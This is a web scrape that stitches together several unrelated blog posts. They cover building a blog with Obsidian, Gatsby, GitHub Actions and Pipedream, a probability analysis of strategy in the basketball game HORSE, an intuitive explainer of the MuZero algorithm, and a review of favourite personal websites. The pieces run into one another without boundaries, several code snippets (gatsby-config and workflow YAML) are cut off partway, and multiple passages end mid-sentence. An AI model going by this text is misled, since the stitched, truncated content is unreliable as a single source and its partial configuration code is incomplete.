<p>I'll keep this short.  Maybe a future blog post will talk about Obsidian in a lot more detail. For now, let me just say that I've tried to get into taking notes for... a long time. I could never do it in college. I struggle to do it for work. I've always found that taking notes takes away from my ability to absorb the content in the moment and make meaningful contributions. </p>
<p>Obsidian was the first app that actually made me <strong>want</strong> to take notes. The general idea is that all your notes are written in markdown. Jumping around is super easy with <code>CMD + O</code> (which also will create pages for you if they don't exist).  Linking between pages to build connections is really easy as can be with a syntax like <code>[[this]]</code>. Obsidian builds a visual graph of the relationships between pages (I'm a sucker for graphs). And finally, you can build templates and insert them with <code>CMD + T</code>. Templates dramatically simplified the boiler plate needed to capture who's attending a meeting, agenda, the date, etc. </p>
<p>Long story short, try it out.  (Or don't, whatever.)  I'm a fan and thought that maybe if I can use it as the interface for writing blog posts that I might <em>actually</em> write some. </p>
<h3 id="automated-backups"><a href="#automated-backups" aria-label="automated backups permalink"></a>Automated Backups</h3>
<p>Obsidian has some 3rd-party plugins that do nifty things.  One of these plugins is called <a href="https://github.com/denolehov/obsidian-git" target="_blank" rel="nofollow noopener noreferrer">Obsidian Git</a> which can automatically backup your notes to a Git repository.</p>
<p>I figured that had to be a way to fetch markdown content from a remote github repository and use it as a content source for Gatsby. There was.</p>
<h3 id="defining-post-information"><a href="#defining-post-information" aria-label="defining post information permalink"></a>Defining Post Information</h3>
<p>Blog post information is defined through the markdown frontmatter.  For example, the frontmatter for this blog post: </p>
<div data-language="yaml"><pre><code><span>---</span>
<span>title</span><span>:</span> The buzzword.engineering Tech Stack
<span>date</span><span>:</span> <span>"12/26/2020"</span>
<span>publish</span><span>:</span> <span>true</span>
<span>template</span><span>:</span> <span>"post"</span>
<span>slug</span><span>:</span> blog<span>-</span>tech<span>-</span>stack
<span>description</span><span>:</span> <span>"I finally got around to putting a blog together that uses Obsidian, Gatsby, and automates tweeting out new posts with Pipedream."</span>
<span>---</span></code></pre></div>
<h2 id="gatsby"><a href="#gatsby" aria-label="gatsby permalink"></a>Gatsby</h2>
<p>I think it's important to start here by saying that I'm <strong>not</strong> a frontend developer. Well, let's rephrase that. I'm writing a blog post that has Gatsby in it.  So it's probably more accurate to say that I'm a <em>very</em> junior frontend developer. </p>
<p>My mental model for Gatsby so far is that it's a framework for building static site generators. There might be a couple frontend purists or gatsby enthusiasts out there who take issue with that definition, please let me know if you've got a better one down in the comments. </p>
<p>There are two main components of Gatsby that drew me to it: </p>
<ol>
<li>It uses <a href="https://reactjs.org/" target="_blank" rel="nofollow noopener noreferrer">React</a>, which is a lot more powerful to me over something like <a href="https://handlebarsjs.com/" target="_blank" rel="nofollow noopener noreferrer">handlebars</a> or go-based html templating. </li>
<li>Gatsby is extensible with a rich plugin ecosystem that contribute to a shared <a href="https://graphql.org/" target="_blank" rel="nofollow noopener noreferrer">GraphQL</a> data layer. When developing your site, you can query the data layer to fetch content for particular pages/components.</li>

<p>I like React and I think Gatsby's extensibility framework and GraphQL data layer is <strong>brilliant</strong>. </p>
<h3 id="the-starter"><a href="#the-starter" aria-label="the starter permalink"></a>The Starter</h3>
<p>Another great thing about Gatsby is their concept of Starters. For this blog, I kicked things off with the <a href="https://github.com/alxshelepenok/gatsby-starter-lumen" target="_blank" rel="nofollow noopener noreferrer">gatsby-starter-lumen</a>. </p>
<h3 id="fetching-content"><a href="#fetching-content" aria-label="fetching content permalink"></a>Fetching Content</h3>
<p>The first thing I had to customize was content sources. The Lumen starter fetches content from the same repository as the blog itself. Thankfully, there's a Gatsby plugin called <a href="https://www.gatsbyjs.com/plugins/gatsby-source-git" target="_blank" rel="nofollow noopener noreferrer"><code>gatsby-source-git</code></a> that allows you to fetch content from a remote Git repository. </p>
<p>During development, I wanted to be able to fetch content from the local copy of the Obsidian backup repository. Gatsby plugins are done by exporting a javascript object from a file called <code>gatsby-config.js</code>.  </p>
<p>Here, I toggle between using the <code>gatsby-source-git</code> plugin and the [<code>gatsby-source-filesystem</code>] based on whether a <code>GATSBY_PREVIEW</code> environment variable is set. </p>
<div data-language="js"><pre><code><span>if</span><span>(</span>process<span>.</span>env<span>.</span><span>GATSBY_PREVIEW</span> <span>==</span> <span>"true"</span><span>)</span><span>{</span>

<p>Comments on blog posts are made possible through a nifty tool called <a href="https://utteranc.es/" target="_blank" rel="nofollow noopener noreferrer">utteranc.es</a>. It's a GitHub Application that uses GitHub Issue threads per blog post to track comments. </p>
<h3 id="post-filtering"><a href="#post-filtering" aria-label="post filtering permalink"></a>Post Filtering</h3>
<p>In the spirit of premature optimization, I wanted to integrate a way to filter blog posts with fuzzy-searching. To accomplish this, I integrated <a href="https://fusejs.io/" target="_blank" rel="nofollow noopener noreferrer">Fuse.js</a> and added a new <code>Filter</code> component to the blog. </p>
<p>Most of the logic for how this was accomplished can be seen in the <a href="https://github.com/steven-terrana/steven-terrana.github.io/blob/main/src/templates/index-template.js" target="_blank" rel="nofollow noopener noreferrer">Index Template</a>.</p>

<h2 id="automation"><a href="#automation" aria-label="automation permalink"></a>Automation</h2>
<p>With the site actually working how I wanted it to, I got to focus on the side of things I'm actually good at: digital duct tape. The goal is for changes in markdown content in the Obsidian backup repository to trigger a deployment of the site and if there is a new blog post, to send out a tweet letting you all know about it. </p>
<h3 id="step-1-github-action-on-the-obsidian-backup-repo"><a href="#step-1-github-action-on-the-obsidian-backup-repo" aria-label="step 1 github action on the obsidian backup repo permalink"></a>Step 1: GitHub Action on the Obsidian Backup Repo</h3>
<p>First things first, the content repository needs to trigger a deployment of the site. The easiest way I could think to accomplish this would be to a GitHub Action on the blog post repository that does the build/deploy logic. </p>
<p>This meant that I needed a way to invoke a GitHub Action on one repository as part of the execution of an Action on another repository. This is where the <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows#repository_dispatch" target="_blank" rel="nofollow noopener noreferrer"><code>repository_dispatch</code></a> event comes in handy. Basically, it means that you can use the GitHub API to trigger an Action. </p>
<p>Here's what the GitHub Action workflow looks like for the obsidian repository: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Trigger Build
<span>on</span><span>:</span>
  
  <span>push</span><span>:</span>
    <span>branches</span><span>:</span> <span>[</span> main <span>]</span>

<p>Sweet. Now commits to the Obsidian backup repository will trigger actions on the blog repository. </p>
<p>The next step was to automate the build and deployment steps using a GitHub Action on the blog repository. Here's what that action looks like: </p>
<div data-language="yaml"><pre><code><span>name</span><span>:</span> Build and Publish

          <span>force_orphan</span><span>:</span> <span>true</span>  </code></pre></div>
<p>This blog is hosted using GitHub Pages, so you'll notice a few things:</p>
<ol>
<li>I add a custom <code>CNAME</code> file to the <code>public</code> directory so that GitHub Pages knows the custom domain for this blog.  (I should definitely incorporate this into an inherit part of the build of the site using the <code>onPostBuild</code> Gatsby Node API method or something). </li>
<li>I use the <code>peaceiris/actions-gh-pages</code> action to publish the site. </li>
</ol>
<p>All in all, this was a pretty painless setup. </p>
<h3 id="step-3-automating-tweets"><a href="#step-3-automating-tweets" aria-label="step 3 automating tweets permalink"></a>Step 3: Automating Tweets</h3>
<p>So at this point, we've got content changes automatically getting deployed to GitHub Pages. The whole process takes about <strong>three minutes</strong> from commit to publish. </p>
<p>The last piece was to automate letting all of you know about the whatever new insightful thing I had to say! </p>
<p>I had stumbled on <a href="https://pipedream.com/" target="_blank" rel="nofollow noopener noreferrer">Pipedream</a> before through targeted ads and sort of ignored it until I saw <a href="https://twitter.com/rawkode" target="_blank" rel="nofollow noopener noreferrer">David McKay</a> talk about how much he loves it on <a href="https://rawkode.live/" target="_blank" rel="nofollow noopener noreferrer">rawkode.live</a>.

<p>I went into this adventure thinking I was going to have to do all kinds of fancy logic and scripting to make this possible. I was wrong. </p>

<p><strong>TL;DR</strong>: If you want to win at HORSE, it’s generally a much better strategy to attempt high percentage shots. It almost never makes sense to shoot crazy half-court shots or behind-the-back shots. As a general rule of thumb, never attempt shots that you can’t shoot at &gt;50%.</p>

<hr>

<p><br>
<a href="https://en.wikipedia.org/wiki/Variations_of_basketball#H-O-R-S-E">HORSE</a> is a popular basketball shooting game. The main choice a HORSE player must make is which spots on the basketball court to attempt shots from. What’s the best strategy to win at HORSE?</p>

<h3 id="game-rules">Game rules</h3>
<p>The version of HORSE I’m analysing here involves two players. In the beginning, it’s Player 1’s turn. The player whose turn it is will be called “C”, and the other player will be called “O”.</p>
<ol>
  <li>C picks a spot on the basketball court and attempts a shot.
    <ul>
      <li>If C misses the shot, it is O’s turn, and we go back to 1.</li>
    </ul>
  </li>
  <li>If C makes the shot, O must now attempt the same shot.
    <ul>
      <li>If O makes the shot, C’s turn continues, and we go back to 1.</li>
      <li>If O misses the shot, they get a letter. C’s turn continues, and we go back to 1.</li>
    </ul>
  </li>
  <li>Once any player has gotten 5 letters, ie HORSE, they lose the game.</li>
</ol>

<p>On Player 2’s turn, Player 1 has no real strategy - they must simply try their best to make the shots that Player 2 makes. The only strategy a player can control is which shots they attempt when it’s their turn.</p>

<h3 id="expected-number-of-turns">Expected number of turns</h3>

<h4 id="deriving-the-formula">Deriving the formula</h4>

<p>Let us calculate the optimal shot on Player 1’s turn. Note that a “turn” lasts as long as the player whose turn it is does not miss their shot. We will assume that Player 1 will shoot the same optimal shot each time it is their turn. Let \(p_1\) be the probability that Player 1 makes this shot, \(p_2\) be the probability that Player 2 makes the same shot, and \(e_N\) be the expected number of turns for Player 1 to win \(N\) letters.</p>

<p>If Player 1 misses the shot, the expected number of turns going forward is \(1 + e_N\), since Player 1 has used up the current turn, and must restart in the same position next turn. If Player 1 makes the shot, and Player 2 misses the shot, the expected number of turns is \(e_{N-1}\), since the turn continues with one less letter to win. Finally, if Player 1 and Player 2 both make the shot, the expected number of turns is simply \(e_N\). Putting these together, we have</p><p>

\[\begin{equation}
e_N = (1 - p_1) (1 + e_N) + p_1 (1 - p_2) e_{N - 1} + p_1 p_2 e_N
\end{equation}\]

</p><p>Re-arranging and expanding for \(e_{N-1},e_{N-2}\ldots e_0\), we get</p><p>

\[\begin{eqnarray}
e_N - e_{N - 1} &amp;= \frac{1 - p_1}{p_1 (1 - p_2)} \\
\vdots \\
e_1 - e_0 &amp;= \frac{1 - p_1}{p_1 (1 - p_2)}
\end{eqnarray}\]

</p><p>\(e_0\) must be \(1\), since \(p_1=1, p_2=0 \implies e_1=1\). Adding the equations above and re-arranging, we get</p><p>

\[e_N = 1 + N\frac{1 - p_1}{p_1 (1 - p_2)}\]

</p><p>For the game of HORSE, \(N=5\), and so the expected number of turns to win HORSE is</p><p>

\[e_5 = 1 + 5\frac{1 - p_1}{p_1 (1 - p_2)} \tag{1} \label{eq:one}\]

</p><p>Our goal is to minimize \(e_5\). \(e_5\) increases with the inverse of the quantities \(\frac{p_1}{1 - p_1}\) and \((1 - p_2)\). Since the former grows much faster than the latter, we can intuit that increasing \(p_1\) is a lot more important than decreasing \(p_2\).</p>

<h4 id="visualizing-the-expected-number-of-turns">Visualizing the expected number of turns</h4>

<p>Since this is a function of two variables, we can visualize it with a contour plot.</p>

<p><img src="https://rishicomplex.github.io/assets/formula.png" alt="Contour plot of function"></p>

<p>As the color gets darker, the expected number of turns decreases, ie we’re more likely to win. As we would expect, the plot gets darker for higher values of \(p_1\) and lower values of \(p_2\), ie to the right and bottom of the plot. What’s interesting to note is that the contour lines are “squeezed” more toward the right than the bottom, indicating that a high \(p_1\) has a stronger effect than a low \(p_2\). For example, if \(p_2=0\) and \(p_1=0.2\), \(\eqref{eq:one}\) gives us \(e_5=21\), whereas if \(p_1=1\) and \(p_2=0.8\) we get \(e_5=1\).</p>

<h4 id="verification-via-simulation">Verification via simulation</h4>

<p>Another way to calculate \(e_5\) empirically is to simulate \(G\) games for each value of \(p_1\) and \(p_2\), and then average the number of turns the game takes to finish over all the games. Doing this with \(G=1000\), I get this plot:</p>

<p><img src="https://rishicomplex.github.io/assets/simulation.png" alt="Contour plot of simulation"></p>

<p>which matches the previous plot. The squiggles are due to randomness.</p>

<h3 id="analyzing-some-special-cases">Analyzing some special cases</h3>

<p>In reality, \(p_1\) and \(p_2\) tend to be related to one another, since shots that are harder for one player tend to be harder for the other player as well.</p>

<p>Let us analyse some special cases, corresponding to the straight lines in the following plot.</p>

<p><img src="https://rishicomplex.github.io/assets/straight_lines.png" alt="Contour plot with straight lines"></p>

<h4 id="both-players-are-equally-good-shooters">Both players are equally good shooters</h4>
<p>This corresponds to the red line above. Here, \(p_1 = p_2\), and \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + \frac{5}{p_1}\]

</p><p>To minimize this, we should pick shots with a \(p_1\) as high as possible. For example, if we keep making layups at a probability of \(0.9\) each, we’d expect the game to be over in less than \(7\) turns.</p>

<h4 id="player-1-is-a-slightly-better-shooter-than-player-2">Player 1 is a slightly better shooter than Player 2</h4>

<p>Let’s say Player 1 always shoots 10% better than Player 2 for any shot. That is, \(p_2 = min(p_1 - 0.1, 0)\) (yellow line above), and when \(p1&gt;0.1\), \(\eqref{eq:one}\) simplifies to</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (1.1 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

<p><img src="https://rishicomplex.github.io/assets/player_1_better.png" alt="Player 1 better"></p>

<p>It is minimized at \(p_1=1\), where \(e_5=1\), that is, the game ends in one turn. Again, Player 1 wants to pick their highest probability shot.</p>

<h4 id="player-2-is-a-slightly-better-shooter-than-player-1">Player 2 is a slightly better shooter than Player 1</h4>

<p>Here, we set \(p_2 = p_1 + 0.1\) (orange line above), which gives us for \(p_1 &lt; 0.9\)</p><p>

\[e_5 = 1 + 5 \frac{1 - p_1}{p_1 (0.9 - p_1)}\]

</p><p>In the range \(p_1 \in [0, 1]\), this function looks like this:</p>

<p><img src="https://rishicomplex.github.io/assets/player_1_worse.png" alt="Player 1 worse"></p>

<p>Interestingly, we cannot simply maximize \(p_1\) here, because once \(p_2\) gets closer to \(1\), we can never win. However, the optimal \(p_1\) is still pretty high, at around \(p_1=0.684\), giving \(e_5=11.7\). If Player 2 (for whom \(e_5\) looks like the previous section) shoots shots at \(p_2&lt;0.4\) (eg three-point shots), they will lose the game, despite being a better shooter.</p>

<h3 id="real-world-strategies">Real world strategies</h3>

<p>In the real world, winning is not the only objective. You don’t want the game to take indefinitely long, and you’d be ridiculed if you kept taking layups. You also have no concrete way to estimate \(p_1\) and \(p_2\) (unless you’ve been playing an opponent for a long time and are keeping a tab on their shooting percentages), and so have to rely on intuition. Some general points to keep in mind:</p>

<ul>
  <li>You’re generally better off taking high percentage shots, even if you’re much better at a low-percentage shot than an opponent. As an example, let’s say you’ve been practicing half-court shots all year, and you can shoot a half court shot at an impressive 20% (\(p_1=0.2\)). You’re sure your opponent can’t shoot that shot if you make it (\(p_2=0\)). Your expected number of turns to win is still \(e_5=21\). Compare that to you shooting a 60% shot which your opponent can also make at 60% (eg a free throw), which lets you win in \(e_5=9.3\) turns. This is more than twice as good as the half court shot! This is because if you and your opponent both make the shot, it’s still your turn. Whereas if you miss your shot by attempting a low percentage shot, your turn is over. You can always win the game in 6-7 turns simply by taking layups at the same percentage as your opponent (assuming \(p_1\) of 0.8-0.9). If we set \(p_2=0\), and solve for \(e_5=7\), we get \(p_1 = 0.45\). That is, even if your opponent can’t make the shot you make at all, there’s generally no point in taking shots that have \(p_1 &lt; 0.45\) - you’re better off shooting layups.</li>
  <li>If you can guess \(p_1\) and \(p_2\) for a bunch of candidate shots, plug them into \(\eqref{eq:one}\) to figure out which shots are your best bet to win.</li>
  <li>Instead of practicing low percentage shots (like behind the backboard arc shots), practice your high percentage shots (like free throws or left handed layups) instead. If you and your opponent can both make a behind the backboard arc shot at 10%, and you practice to push yourself to 20%, you still go from winning in 51 turns to 23 turns. Compare that with converting your free throw from 60% to 70% - that pushes your expected turns from 9.3 to 6.4.</li>
  <li>Find novel-looking high percentage shots so that you can use an effective strategy while not getting ridiculed for just attempting layups. Examples are left handed close up shots, floaters, bank shots.</li>
</ul>

<p>I’d also recommend playing HORSE with modified rules, eg</p>
<ul>
  <li>No shots from inside the paint.</li>
  <li>No repeated shots from the same spot in a turn.</li>
  <li>If both players make three shots in a row, it’s Player 2’s turn.</li>
</ul>

<p>This should reduce the effectiveness of the layup strategy and make the game more fun.</p>

December 27, 2020 | http://www.furidamu.org/blog/2020/12/22/muzero-intuition/ | <a href="https://web.archive.org/web/*/http://www.furidamu.org/blog/2020/12/22/muzero-intuition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article_text">
    <p>To celebrate the publication of our <em>MuZero</em> paper in <a href="https://www.nature.com/articles/s41586-020-03051-4">Nature</a>, I've written a high level description of the <em>MuZero</em> algorithm. My focus here is to give you an intuitive understanding and general overview of the algorithm; for the full details please read the <a href="http://www.furidamu.org/publications/">paper</a>. Please also see our <a href="https://deepmind.com/blog/article/muzero-mastering-go-chess-shogi-and-atari-without-rules">official DeepMind blog post</a>, it has great animated versions of the figures!</p>
<p>MuZero is a very exciting step forward - it requires no special knowledge of game rules or environment dynamics, instead learning a model of the environment for itself and using this model to plan. Even though it uses such a learned model, MuZero preserves the full planning performance of AlphaZero - opening the door to applying it to many real world problems!</p>
<h2>It's all just statistics</h2>
<p><em>MuZero</em> is a machine learning algorithm, so naturally the first thing to understand is how it uses neural networks. From AlphaGo and AlphaZero, it inherited the use of policy and value networks<sup id="fnref:1"><a href="#fn:1">1</a></sup>:</p>
<p><img alt="Schematic illustration of value and policy network mapping from a Go board to a value resp. policy estimate" src="http://www.furidamu.org/images/2020-12-22-muzero-intuition/value_policy_net.jpg"></p>
<p>Both the policy and the value have a very intuitive meaning:</p>
<ul>
<li>
<p>The policy, written $p(s, a)$, is a probability distribution over all actions $a$ that can be taken in state $s$. It estimates which action is likely to be the optimal action. The policy is similar to the first guess for a good move that a human player has when quickly glancing at a game.</p>
</li>
<li>
<p>The value $v(s)$ estimates the probability of winning from the current state $s$: averaging over all possible future possibilities, weighted by how likely they are, in what fraction of them would the current player win?</p>
</li>
</ul>
<p>Each of these networks on their own is already very powerful: If you only have a policy network, you could simply always play the move it predicts as most likely and end up with a very decent player. Similarly, given only a value network, you could always choose the move with the highest value. However, combining both estimates leads to even better results.</p>
<h2>Planning to Win</h2>
<p>Similar to <em>AlphaGo</em> and <em>AlphaZero</em> before it, <em>MuZero</em> uses Monte Carlo Tree Search<sup id="fnref:2"><a href="#fn:2">2</a></sup>, short MCTS, to aggregate neural network predictions and choose actions to apply to the environment.</p>
<p>MCTS is an iterative, best-first tree search procedure. Best-first means expansion of the search tree is guided by the value estimates in the search tree. Compared to classic methods such as breadth-first (expand the entire tree up to a fixed depth before searching deeper) or depth-first (consecutively expand each possible path until the end of the game before trying the next), best-first search can take advantage of heuristic estimates (such as neural networks) to find promising solutions even in very large search spaces.</p>
<p>MCTS has three main phases: simulation, expansion and backpropagation. By repeatedly executing these phases, MCTS incrementally builds a search tree over future action sequences one node at a time. In this tree, each node is a future state, while the edges between nodes represent actions leading from one state to the next.</p>
<p>Before we dive into the details, let me introduce a schematic representation of such a search tree, including the neural network predictions made by <em>MuZero</em>:</p>
<p><img alt="diagram of the muzero search tree, and the use of representation, dynamics and prediction function" src="http://www.furidamu.org/images/2020-12-22-muzero-intuition/search_tree.jpg"></p>
<p>Circles represent nodes of the tree, which correspond to states in the environment. Lines represent actions, leading from one state to the next. The tree is rooted at the top, at the current state of the environment - represented by a schematic Go board. We will cover the details of representation, prediction and dynamics functions in a later section.</p>
<p><strong>Simulation</strong> always starts at the root of the tree (light blue circle at the top of the figure), the current position in the environment or game. At each node (state $s$), it uses a scoring function $U(s, a)$ to compare different actions $a$ and chose the most promising one. The scoring function used in <em>MuZero</em> would combine a prior estimate $p(s, a)$ with the value estimate for $v(s')$:</p>
<p>$$
U(s, a) = v(s') + c \cdot p(s, a)
$$</p>
<p>where $c$ is a scaling factor<sup id="fnref:3"><a href="#fn:3">3</a></sup> that ensures that the influence of the prior diminishes as our value estimate becomes more accurate.</p>
<p>Each time an action is selected, we increment its associated visit count $n(s, a)$, for use in the UCB scaling factor $c$ and for later action selection.</p>
<p>Simulation proceeds down the tree until it reaches a leaf that has not yet been expanded; at this point the neural network is used to evaluate the node. Evaluation results (prior and value estimates) are stored in the node.</p>
<p><strong>Expansion</strong>: Once a node has reached a certain number of evaluations, it is marked as "expanded". Being expanded means that children can be added to a node; this allows the search to proceed deeper. In <em>MuZero</em>, the expansion threshold is 1, i.e. every node is expanded immediately after it is evaluated for the first time. Higher expansion thresholds can be useful to collect more reliable statistics<sup id="fnref:4"><a href="#fn:4">4</a></sup> before searching deeper.</p>
<p><strong>Backpropagation</strong>: Finally, the value estimate from the neural network evaluation is propagated back up the search tree; each node keeps a running mean of all value estimates below it. This averaging process is what allows the UCB formula to make increasingly accurate decisions over time, and so ensures that the MCTS will eventually converge to the best move.</p>
<h2>Intermediate Rewards</h2>
<p>The astute reader may have noticed that the figure above also includes the prediction of a quantity $r$. Some domains, such as board games, only provide feedback at the end of an episode (e.g. a win/loss result); they can be modeled purely through value estimates. Other domains however provide more frequent feedback, in the general case a reward $r$ is observed after every transition from one state to the next.</p>
<p>Directly modeling this reward through a neural network prediction and using it in the search is advantageous. It only requires a slight modification to the UCB formula:</p>
<p>$$
U(s, a) = r(s, a) + \gamma \cdot v(s') + c \cdot p(s, a)
$$</p>
<p>where $r(s, a)$ is the reward observed in transitioning from state $s$ by choosing action $a$, and $\gamma$ is a discount factor that describes how much we care about future rewards.</p>
<p>Since in general rewards can have arbitrary scale, we further normalize the combined reward/value estimate to lie in the interval $[0, 1]$ before combining it with the prior:</p>
<p>$$
U(s, a) = \frac{r(s, a) + \gamma \cdot v(s') - q_{min}}{q_{max} - q_{min}} + c \cdot p(s, a)
$$</p>
<p>where $q_{min}$ and $q_{max}$ are the minimum and maximum $r(s, a) + \gamma \cdot v(s')$ estimates observed across the search tree.</p>
<h2>Episode Generation</h2>
<p>The MCTS procedure described above can be applied repeatedly to play entire episodes:</p>
<ul>
<li>Run a search in the current state $s_t$ of the environment.</li>
<li>Select an action $a_{t+1}$ according to the statistics $\pi_t$ of the search.</li>
<li>Apply the action to the environment to advance to the next state $s_{t+1}$ and observe reward $u_{t+1}$.</li>
<li>Repeat until the environment terminates.</li>
</ul>
<p><img alt="generation of episodes by running MCTS in each state, selecting an action and advancing the environment" src="http://www.furidamu.org/images/2020-12-22-muzero-intuition/episode_generation.jpg"></p>
<p>Action selection can either be greedy - select the action with the most visits - or exploratory: sample action $a$ proportional to its visit count $n(s, a)$, potentially after applying some temperature $t$ to control the degree of exploration:</p>
<p>$$
p(a) = {\left( \frac{n(s, a)}{\sum_b n(s, b)} \right)}^{1/t}
$$</p>
<p>For $t = 0$, we recover greedy action selection; $t = \inf$ is equivalent to sampling actions uniformly.</p>
<h2>Training</h2>
<p>Now that we know how to run MCTS to select actions, interact with the environment and generate episodes, we can turn towards training the <em>MuZero</em> model.</p>
<p>We start by sampling a trajectory and a position within it from our dataset, then we unroll the <em>MuZero</em> model alongside the trajectory:</p>
<p><img alt="training unrolls the muzero model along the trajectory" src="http://www.furidamu.org/images/2020-12-22-muzero-intuition/training.jpg"></p>
<p>You can see the three parts of the <em>MuZero</em> algorithm in action:</p>
<ul>
<li>the <strong>representation</strong> function $h$ maps from a set of observations (the schematic Go board) to the hidden state $s$ used by the neural network</li>
<li>the <strong>dynamics</strong> function $g$ maps from a state $s_t$ to the next state $s_{t+1}$ based on an action $a_{t+1}$. It also estimates the reward $r_t$ observed in this transition. This is what allows the learned model to be rolled forward inside the search.</li>
<li>the <strong>prediction</strong> function $f$ makes estimates for policy $p_t$ and value $v_t$ based on a state $s_t$. These are the estimates used by the UCB formula and aggregated in the MCTS.</li>
</ul>
<p>The observations and actions used as input to the network are taken from this trajectory; similarly the prediction targets for policy, value and reward are the ones stored with the trajectory when it was generated.</p>
<p>You can see this alignment between episode generation (<strong>B</strong>) and training (<strong>C</strong>) even more clearly in the full figure:</p>
<p><img alt="the three previous figures in a single picture" src="http://www.furidamu.org/images/2020-12-22-muzero-intuition/full_algorithm.jpg"></p>
<p>Specifically, the training losses for the three quantities estimated by <em>MuZero</em> are:</p>
<ul>
<li><strong>policy</strong>: cross-entropy between MCTS visit count statistics and policy logits from the prediction function.</li>
<li><strong>value</strong>: cross-entropy or mean squared error between discounted sum of N rewards + stored search value or target network estimate and value from the prediction function<sup id="fnref:5"><a href="#fn:5">5</a></sup>.</li>
<li><strong>reward</strong>: cross-entropy between reward observed in the trajectory and dynamics function estimate.</li>
</ul>
<h2>Reanalyse</h2>
<p>Having examined the core <em>MuZero</em> training, we are ready to take a look at the technique that allows us to leverage the search to achieve massive data-efficiency improvements: Reanalyse.</p>
<p>In the course of normal training, we generate many trajectories (interactions with the environment) and store them in our replay buffer for training. Can we get more mileage out of this data?</p>
<p><img alt="sequence of states representing an episode" src="http://www.furidamu.org/images/2020-12-22-muzero-intuition/trajectory.jpg"></p>
<p>Unfortunately, since this is stored data, we cannot change the states, actions or received rewards - this would require resetting the environment to an arbitrary state and continuing from there. Possible in The Matrix, but not in the real world.</p>
<p>Luckily, it turns out that we don't need to - using existing inputs with fresh, improved labels is enough for continued learning. Thanks to <em>MuZero</em>'s learned model and the MCTS, this is exactly what we can do:</p>
<p><img alt="sequence of states with new MCTS trees at each state" src="http://www.furidamu.org/images/2020-12-22-muzero-intuition/reanalyse.jpg"></p>
<p>We keep the saved trajectory (observations, actions and rewards) as is and instead only re-run the MCTS. This generates fresh search statistics, providing us with new targets for the policy and value …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I chose five personal websites out of the thirty or so I visit regularly and tried to understand what it is about them that utterly captures me.</p>
<p>Whether or not it is obvious to you, I have stolen many things from the following websites. Be it design tweaks, post ideas, or even turns of phrase. These websites are incredible and you should consume them.</p>
<p>Good artists borrow, great artists <del>steal</del> use the inspect tool.</p>

<p>I have been following Justin Duke’s writing for close to two years. His older page is now <a href="https://jmduke.com/">depreciated</a> and he posts to <em>arcana dot computer</em>, an <a href="https://github.com/jmduke/arcana.computer">open source</a> website filled with catalogs and footnotes and light-touch design. The main framework is Jekyll, with dynamic content powered by Airtable. The <a href="https://arcana.computer/miscellany/this-site.html">About</a> page of Justin’s website explains the development/design/ideas behind the website in rich detail. So in this section I’ll instead focus on how I <em>feel</em> about the website.</p>
<p><span>
      <a href="https://healeycodes.com/static/b8e7b3aa62f5210ac62bb4003ff06458/0f09e/arcana.computer.png" target="_blank" rel="noopener">

  </a>
    </span></p>
<p>My philosophy towards personal websites matches Justin’s. He writes:</p>
<blockquote>
<p>Lastly, if there’s anything I can convince you of: you should build a personal site, you should obsess over it, you should meticulously document it, and you should have quite a bit of fun doing so. (It’s worth it.)</p>
</blockquote>
<p>The content throughout these pages is personal and reads true. Although it’s not a journal as such, as I read through the notes and reviews I get a secret feeling that I’m looking somewhere I shouldn’t be — like peeking in a hidden diary.</p>
<p>Justin writes about capturing his <a href="https://arcana.computer/catalogs/media-diet">media diet</a>:</p>
<blockquote>
<p>This started out as a lazy compulsion, but I’ve grown rather found of this habit over time. “You are what you eat”, and all that — I’ve realized that paying more attention to how I’m spending my consumptive time has made me more focused on consuming what I’m interested in, and not simply what’s easiest.</p>
</blockquote>
<p>He talks about reviewing older sections of his media diet and how it helps him recollect that time in his life — “suddenly I am taken back to my old apartment on Capitol Hill, and my three weeks of funemployment before Stripe”. When coming across old words that I have written, I’ve also experienced this almost-olfactory flashback of thoughts.</p>

    </span></p>
<p>Overall, I am impressed with the breadth and depth of content on Justin’s website, as well as how he’s made Airtable work for him. I also like that sections are marked as in-progress. I like the personal structure to it. His methods for working on this website are similar to the goals of the <a href="https://en.wikipedia.org/wiki/Long_Now_Foundation">Long Now</a> and that gels with me.</p>

<p>Paul Stamatiou writes long form articles about his life and technology. If someone has a curiosity about a subject that he has covered (e.g. <a href="https://paulstamatiou.com/made-on-an-ipad-pro/">creating with the iPad Pro</a>, or <a href="https://paulstamatiou.com/building-a-windows-10-lightroom-photo-editing-pc/">building a lightroom PC</a>) I wouldn’t hesitate linking one of his articles to them — perhaps without even reading it — because of the consistent high quality I have come to expect.</p>
<p><span>
      <a href="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" target="_blank" rel="noopener">

  <img alt="Paul Stamatiou's website." title="Paul Stamatiou's website." src="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/e9985/paulstamatiou.com.png" srcset="https://healeycodes.com/static/ed6bc43b992468145fd897cc2925f6fd/a8a0d/paulstamatiou.com.png 300w,

  </a>
    </span></p>
<p>However, this quality comes with a cost, as he describes in <a href="https://paulstamatiou.com/writing-more/">Writing more</a>:</p>
<blockquote>
<p>I’m going to try something different and write more short-form posts here.</p>
</blockquote>
<blockquote>
<p>Over the years my focus has been increasing the quality of my articles. They’ve ended up becoming increasingly time-consuming to create.</p>
</blockquote>
<p>Although these articles (which for now he seems to have dubbed “briefs”) are shorter and less researched than his other writing they read as complete entries to me. On another website, by another person, they would be complete blog posts.</p>
<p>The more things I write, the more hesitant I am to actually publish. So the way he talks about blogging in <em>Writing more</em> resonates with me:</p>
<blockquote>
<p>I want to get back to what blogging felt like when I started in 2005. Back when posting a few sentences and publishing it within the same computing session was so easy and fun. Where expectations were low and it didn’t have to be perfect.</p>
</blockquote>
<p>He has written 1210 posts since 2005. My first thought goes to the build times of such a website! In 2011, he migrated from <a href="https://paulstamatiou.com/how-to-wordpress-to-jekyll/">Wordpress to Jekyll</a>. This year he <a href="https://twitter.com/Stammy/status/1307347164599922689">tweeted</a> that he’s looking at moving again:</p>
<blockquote>
